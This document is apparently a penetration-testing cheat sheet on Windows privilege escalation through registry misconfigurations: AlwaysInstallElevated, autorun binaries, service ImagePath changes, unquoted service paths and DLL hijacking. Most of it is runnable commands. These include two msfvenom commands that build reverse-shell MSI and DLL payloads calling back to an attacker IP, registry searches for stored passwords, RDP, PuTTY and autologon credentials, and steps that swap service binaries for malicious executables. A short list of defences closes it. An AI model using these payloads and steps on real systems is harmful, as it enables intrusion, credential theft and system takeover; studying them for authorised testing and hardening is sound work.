# Windows Registry Exploits

The Windows Registry is a hierarchical database that stores configuration settings and options for the operating system. Misconfigurations in the registry can lead to privilege escalation opportunities.

## Registry Basics

```powershell
# Main registry hives
HKEY_CURRENT_USER (HKCU) - Contains user-specific configuration
HKEY_LOCAL_MACHINE (HKLM) - Contains system-wide settings
HKEY_CLASSES_ROOT (HKCR) - File associations and COM objects
HKEY_USERS (HKU) - All user profiles on the system
HKEY_CURRENT_CONFIG (HKCC) - Hardware profile information
```

## AlwaysInstallElevated Privilege Escalation

The AlwaysInstallElevated policy allows non-privileged users to run Microsoft Windows Installer package files (MSI) with elevated (SYSTEM) privileges.

### Detection

Both registry keys need to be set to 1:

```cmd
# Check HKEY_CURRENT_USER
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Check HKEY_LOCAL_MACHINE
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploitation

If both registry values are 1, create a malicious MSI package:

```bash
# On Kali Linux / Attack Machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o malicious.msi
```

Transfer the MSI file to the target and execute:

```cmd
# Execute the MSI silently
msiexec /quiet /qn /i C:\path\to\malicious.msi
```

## AutoRun Programs

Windows can be configured to automatically run programs when a user logs in. If these registry keys point to executables we can modify, we can escalate privileges.

### Detection

```cmd
# Check for autorun programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
```

### Exploitation

1. Identify a writable autorun program
2. Replace it with a malicious executable or modify it to execute your payload
3. Wait for a privileged user to log in (or restart if it's a system autorun)

```cmd
# Check permissions on an autorun executable
icacls "C:\Path\To\AutoRun.exe"

# Replace with malicious executable
copy C:\Path\To\malicious.exe "C:\Path\To\AutoRun.exe" /Y
```

## Stored Credentials in Registry

The registry may contain credentials or encoded passwords that can be extracted.

### Detection

```cmd
# Search for passwords in the registry
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s

# Check for stored RDP credentials
reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /s

# Check for PuTTY session information
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# Check for auto-login credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" /v DefaultPassword
```

## Service Registry Permissions

If a user has permission to modify service registry entries, they can point the service to a malicious executable.

### Detection

```powershell
# PowerShell script to check service registry permissions
$services = Get-ChildItem HKLM:\SYSTEM\CurrentControlSet\Services
foreach($service in $services) {
    $path = $service.Name.Replace("HKEY_LOCAL_MACHINE","HKLM:")
    $acl = Get-Acl $path
    foreach($entry in $acl.Access) {
        if($entry.RegistryRights.ToString() -match "FullControl|WriteKey|SetValue|CreateSubKey" -and $entry.IdentityReference -notmatch "NT AUTHORITY\\SYSTEM|BUILTIN\\Administrators") {
            Write-Host "Vulnerable service found: $path"
            Write-Host "Identity: $($entry.IdentityReference)"
            Write-Host "Permissions: $($entry.RegistryRights)"
        }
    }
}
```

### Exploitation

1. Identify a service with vulnerable registry permissions
2. Modify the ImagePath value to point to your malicious executable
3. Restart the service

```cmd
# Check the current ImagePath
reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath

# Modify the ImagePath
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnService /v ImagePath /t REG_EXPAND_SZ /d "C:\path\to\malicious.exe" /f

# Restart the service (if you have permissions)
sc stop VulnService
sc start VulnService
```

## Unquoted Service Paths

If a service path contains spaces and is not enclosed in quotes, Windows will try to execute each valid path with spaces.

### Detection

```cmd
# Find services with unquoted paths and spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell alternative
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -match " "} | Select-Object Name, PathName, StartMode
```

### Exploitation

1. Identify a service with an unquoted path containing spaces
2. Check write permissions in the directories along the path
3. Create a malicious executable in one of the writable directories, following the space pattern

```cmd
# Example: Service path is "C:\Program Files\Vulnerable Service\service.exe"
# Windows will try:
# 1. C:\Program.exe
# 2. C:\Program Files\Vulnerable.exe
# 3. C:\Program Files\Vulnerable Service\service.exe

# Check permissions on the directories
icacls "C:\Program Files"
icacls "C:\Program Files\Vulnerable Service"

# If you have write permissions to any of these locations, place a malicious executable there
copy malicious.exe "C:\Program Files\Vulnerable.exe"

# Restart the service
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

## Registry Hijacking for DLL Search Order

Applications often look for DLLs in specific locations, which can be controlled through registry entries.

### Detection

Look for registry keys that specify DLL search paths:

```cmd
# Search for DLL-related registry keys
reg query HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs
```

### Exploitation

If you can write to a folder specified in a DLL search path:

```cmd
# Create a malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o malicious.dll

# Copy to the directory in the search path
copy malicious.dll C:\Path\Specified\In\Registry\missing-dll.dll

# Wait for the application to load the DLL
```

## WOW64 Registry Redirection

On 64-bit systems, the registry redirects 32-bit application requests. This can be abused in some scenarios.

```cmd
# 32-bit applications accessing HKLM\Software will be redirected to:
reg query HKLM\SOFTWARE\WOW6432Node

# Check if there are differences in permissions between the two:
reg query HKLM\SOFTWARE\SomeApplication /s
reg query HKLM\SOFTWARE\WOW6432Node\SomeApplication /s
```

## Protecting Against Registry-Based Attacks

1. Limit registry write permissions for standard users
2. Use properly quoted service paths
3. Disable AlwaysInstallElevated policy
4. Audit registry changes for sensitive keys
5. Use secure boot and execute prevention mechanisms
6. Avoid storing credentials in the registry
7. Implement proper service account isolation 